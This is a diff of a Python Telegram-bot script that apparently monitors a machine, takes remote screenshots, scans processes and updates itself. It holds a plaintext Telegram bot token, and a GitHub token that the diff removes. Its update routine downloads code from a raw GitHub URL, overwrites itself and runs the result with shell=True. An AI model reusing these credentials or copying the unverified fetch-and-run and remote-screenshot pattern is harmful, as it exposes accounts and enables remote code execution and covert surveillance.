@@ -1,3 +1,4 @@
+import urllib3 
 import regex
 import subprocess
 import logging
@@ -21,19 +22,22 @@ import time
 
 
 
-
-github_token="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"
-#token for github access
 file=sys.argv[0] 
 #Token for the telegram bot.
 token="6199318379:AAGmrDxxhYeYWabD8MqyrMMwKvVztDkPhGE"
 #url for online update source
 url="https://raw.githubusercontent.com/Mainakdey1/PythonStuff/main/development_file.py"
 #delay value(int) for process scanner
-delay=0.0001
+delay=0.1
 
 
 
+#version 
+__version__=1.09
+
+
+
+#scanner class for scanning and keeping track of currently running programs.
 class process_scanner:
     
 
@@ -63,6 +67,10 @@ class process_scanner:
         return self._hidev,__name__
  
 
+#Logger class for logging events. Events have 3 severity:info, warning and critical
+#info: call with this to record events that are part of the normal functioning of the program
+#warning: call with this severity to record events that are crucial but will not break the funtioning of the program.
+#critical: call with this severity to record events that are critical to the functioning of the program.
 
 class logger:
 
@@ -92,31 +100,23 @@ class logger:
         log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=CRITICAL)with message:  "+_message)
         log_file.close()
  
-
+#call this method to produce the log file
     def producelog(self):
         log_file=open(self._log_file,"r")
         msg=log_file.readlines()
         log_file.close()
         return msg
     
-
+#call this method to find the privilege level of the current logging instance.
     def privilege(self):
         if self._global_severity==0:
             print("This logger is at the highest privilege level")
         else:
             return self._global_severity
         
+#call this method to identify the logging instance, if there are several instances initiated.
     def identify(self):
         print(self._logobj)
-
-
-
-
-
-__version__=1.10
-
-#version works?
-
 
 
 
@@ -129,7 +129,7 @@ __version__=1.10
 logins=logger("logfile.txt",0,"globallogger")
 
 
-
+#installs crucial modules by calling pip. Note: programmatic use of pip is strictly not allowed.
 try:
     required={"python-telegram-bot","psutil","datetime","messages","urllib3","regex","psutil","datetime","pyautogui","elevate"}
     installed={pkg.key for pkg in pkg_resources.working_set}
@@ -146,13 +146,13 @@ except:
 
 
 
-
+#initiate connection object.
 try:
+
     connection_pool=urllib3.PoolManager()
     resp=connection_pool.request("GET",url)
     match_regex=regex.search(r'__version__*= *(\S+)', resp.data.decode("utf-8"))
     logins.info("CONNECTION OBJECT","CONNECTION OBJECT INITIALIZED")
-
 except:
     logins.critical("CONNECTION OBJECT","CONNECTION OBJECT NOT INITIALIZED")
 
@@ -164,6 +164,7 @@ except:
 
 match_regexno=float(match_regex.group(1))
 
+#version matching is done here
 if match_regexno>__version__:
 
     try:
@@ -172,7 +173,7 @@ if match_regexno>__version__:
         #new version available. update immediately
         logins.info("REGEX VERSION MATCH","NEW VERSION FOUND")
         origin_file=open(file,"wb")
-        origin_file.write(content_file)
+        origin_file.write(resp.data)
         origin_file.close()
         logins.info("REGEX VERSION MATCH","SUCCESFUL")
         subprocess.call(file,shell=True)
@@ -186,7 +187,7 @@ elif match_regexno<__version__:
         #version rollback initiated. updating to old version
         logins.info("REGEX VERSION MATCH","NEW VERSION FOUND")
         origin_file=open(file,"wb")
-        origin_file.write(content_file)
+        origin_file.write(resp.data)
         origin_file.close()
         logins.info("REGEX VERSION MATCH","VERSION ROLLBACK INITIATED")
         subprocess.call(file,shell=True)
@@ -197,16 +198,12 @@ else:
     #update not called.
     logins.info("REGEX VERSION MATCH","NO NEW VERSION FOUND")
 
-    #rest of the code
     
    
+
+
     
-
-    #Unit test for checking that essential modules are present01
-
-
-
-    #Unit test for checking and matching telegram version02
+    #telegram module version matching.
 
     from telegram import __version__ as TG_VER
 
@@ -224,11 +221,6 @@ else:
             f"visit https://docs.python-telegram-bot.org/en/v{TG_VER}/examples.html"
             
         )
-
-
-
-
-    #Module import
 
 
 
@@ -395,7 +387,7 @@ else:
         try:
             ret=queue.get()
             logins.info("PROCESS SCANNER","PROCESS SCAN STARTED WITH DELAY "+str(delay) )
-            apr=process_scanner("scA")
+            apr=process_scanner("scobj_A")
             apr.start_scan(delay)
             logins.info("PROCESS SCANNER","RESTRICTED APP CALLED, CLOSING MAIN")
             
@@ -427,8 +419,8 @@ else:
         application.add_handler(CommandHandler("cpu",cpu_time)) #type /cpu
         application.add_handler(CommandHandler("getupdate",getupdate)) #type /getupdate
         application.add_handler(CommandHandler("sc",image_grab)) #type /sc
-        application.add_handler(CommandHandler("getlogfile",get_log_file))
-        application.add_handler(CommandHandler("clearlogfile",clear_log_file))
+        application.add_handler(CommandHandler("getlogfile",get_log_file))#type /getlogfile
+        application.add_handler(CommandHandler("clearlogfile",clear_log_file)) #type /clearlogfile
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, show_message))
 
 
@@ -454,7 +446,7 @@ else:
 
 
 
-    
+    #fallback method if thread termination fails to work.
     def end_main_process():
         sys.exit()
 #MAIN CALLED HERE
@@ -465,6 +457,10 @@ else:
             queue.put(ret)
             #Scanner thread created here
             p=Process(target=start_subprocess,args=(queue,))
+            #Note: Thread creation causes execution of top level scope again.
+            #Please be aware of this when defining functions at the top level scope
+            #as otherwise they will be called more than once depending on how many threads you create.
+
             try:
 
                 p.start()
